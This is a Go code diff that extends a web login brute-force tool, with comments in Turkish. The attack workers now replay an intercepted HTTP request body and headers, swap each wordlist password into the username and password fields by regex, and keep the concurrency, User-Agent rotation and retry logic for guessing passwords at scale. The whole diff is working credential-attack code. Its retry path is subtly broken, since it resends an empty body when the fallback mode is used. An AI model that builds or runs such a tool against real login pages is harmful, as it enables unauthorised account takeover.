@@ -27,6 +27,8 @@ type AttackConfig struct {
 	UserField    string // default "username"
 	PassField    string // default "password"
 	SuccessRegex string // optional regex to check in response body
+	OriginalBody string // To store the original intercepted HTTP body
+	Headers      map[string]string // Original request headers
 	Concurrency  int    // number of workers
 	IsJSON       bool   // if true, send as JSON instead of form-urlencoded
 	DelayMs      int    // Delay between each request
@@ -166,6 +168,18 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 		},
 	}
 
+	// CLI modundan veya boş başlatılan durumlarda Default Header ayarlaması (Concurrent Map Write Panic'i önlemek için worker öncesi yapılır)
+	if config.OriginalBody == "" {
+		if config.Headers == nil {
+			config.Headers = make(map[string]string)
+		}
+		if config.IsJSON {
+			config.Headers["Content-Type"] = "application/json"
+		} else {
+			config.Headers["Content-Type"] = "application/x-www-form-urlencoded"
+		}
+	}
+
 	// Workers
 	// fmt.Printf("[Attack] Spawning %d workers...\n", config.Concurrency)
 	for w := 0; w < config.Concurrency; w++ {
@@ -182,21 +196,48 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 					res := attackResult{password: job.password, attempt: job.attempt}
 
 				var reqBody io.Reader
-				contentType := "application/x-www-form-urlencoded"
+				
+				// Orijinal Body'i kullan (Auto-Injection)
+				payloadStr := config.OriginalBody
+				
+				// Eğer "[MANUEL]" seçilmediyse ve orijinal body varsa, dinamik olarak değiştir
+				if config.UserField != "[MANUEL]" && config.UserField != "" {
+					// Çok basit bir string replace. Profesyonel araçlarda genelde regex ile tam eşleşme yapılır
+					// ama şimdilik hedef alana ait = değerinin sonrasını bulup değiştiriyoruz.
+					// Örn: username=eski_deger -> username=admin
+					re := regexp.MustCompile(fmt.Sprintf(`(%s)=([^&]+)`, regexp.QuoteMeta(config.UserField)))
+					payloadStr = re.ReplaceAllString(payloadStr, fmt.Sprintf("${1}=%s", url.QueryEscape(config.Username)))
 
-				if config.IsJSON {
-					contentType = "application/json"
-					payload := map[string]string{
-						config.UserField: config.Username,
-						config.PassField: job.password,
+					// JSON için çok kaba bir yaklaşım (Gerçekte AST veya Unmarshal/Marshal gerekir ama şimdilik string replace)
+					reJson := regexp.MustCompile(fmt.Sprintf(`"%s"\s*:\s*"[^"]*"`, regexp.QuoteMeta(config.UserField)))
+					payloadStr = reJson.ReplaceAllString(payloadStr, fmt.Sprintf(`"%s":"%s"`, config.UserField, config.Username))
+				}
+
+				if config.PassField != "[MANUEL]" && config.PassField != "" {
+					re := regexp.MustCompile(fmt.Sprintf(`(%s)=([^&]+)`, regexp.QuoteMeta(config.PassField)))
+					payloadStr = re.ReplaceAllString(payloadStr, fmt.Sprintf("${1}=%s", url.QueryEscape(job.password)))
+
+					reJson := regexp.MustCompile(fmt.Sprintf(`"%s"\s*:\s*"[^"]*"`, regexp.QuoteMeta(config.PassField)))
+					payloadStr = reJson.ReplaceAllString(payloadStr, fmt.Sprintf(`"%s":"%s"`, config.PassField, job.password))
+				}
+
+				// Eğer tamamen boşsa veya "Manuel" modundaysak fallback (Eski sistem)
+				if payloadStr == "" {
+					if config.IsJSON {
+						payload := map[string]string{
+							config.UserField: config.Username,
+							config.PassField: job.password,
+						}
+						jsonBytes, _ := json.Marshal(payload)
+						reqBody = bytes.NewReader(jsonBytes)
+					} else {
+						data := url.Values{}
+						data.Set(config.UserField, config.Username)
+						data.Set(config.PassField, job.password)
+						reqBody = strings.NewReader(data.Encode())
 					}
-					jsonBytes, _ := json.Marshal(payload)
-					reqBody = bytes.NewReader(jsonBytes)
 				} else {
-					data := url.Values{}
-					data.Set(config.UserField, config.Username)
-					data.Set(config.PassField, job.password)
-					reqBody = strings.NewReader(data.Encode())
+					reqBody = strings.NewReader(payloadStr)
 				}
 
 				// Max 3 retries for transient errors or rate limits
@@ -207,7 +248,24 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 						res.err = err
 						break
 					}
-					req.Header.Add("Content-Type", contentType)
+					
+					// Eski sistem Content-Type'ı ekliyordu, yeni sistemde Headers map'inden geliyor zaten.
+					if contentType, ok := config.Headers["Content-Type"]; ok && config.Headers != nil {
+						// Content type already set in headers loop below
+						_ = contentType
+					}
+
+					// Orijinal Headerları Set Et
+					if config.Headers != nil {
+						for k, v := range config.Headers {
+							if strings.ToLower(k) == "host" {
+								req.Host = v
+							} else {
+								req.Header.Set(k, v)
+							}
+						}
+					}
+
 					if config.RandomUA {
 						ua := userAgents[time.Now().UnixNano()%int64(len(userAgents))]
 						req.Header.Set("User-Agent", ua)
@@ -221,19 +279,7 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 
 					// If we need to retry, we must recreate the body reader
 					if retry > 0 {
-						if config.IsJSON {
-							payload := map[string]string{
-								config.UserField: config.Username,
-								config.PassField: job.password,
-							}
-							jsonBytes, _ := json.Marshal(payload)
-							req.Body = io.NopCloser(bytes.NewReader(jsonBytes))
-						} else {
-							data := url.Values{}
-							data.Set(config.UserField, config.Username)
-							data.Set(config.PassField, job.password)
-							req.Body = io.NopCloser(strings.NewReader(data.Encode()))
-						}
+						req.Body = io.NopCloser(strings.NewReader(payloadStr))
 					}
 
 					resp, err := transport.Do(req)
@@ -439,6 +485,11 @@ func RunBruteForce(config AttackConfig) {
 	fmt.Printf("Target: %s\n", config.TargetURL)
 	fmt.Printf("Username: %s\n", config.Username)
 	fmt.Printf("Wordlist: %s\n", config.Wordlist)
+
+	// Provide empty maps for CLI fallback to prevent nil pointer errors
+	if config.Headers == nil {
+		config.Headers = make(map[string]string)
+	}
 	
 	updateChan := make(chan AttackProgressMsg)
 	cancelChan := make(chan bool) // Dummy cancel channel for CLI
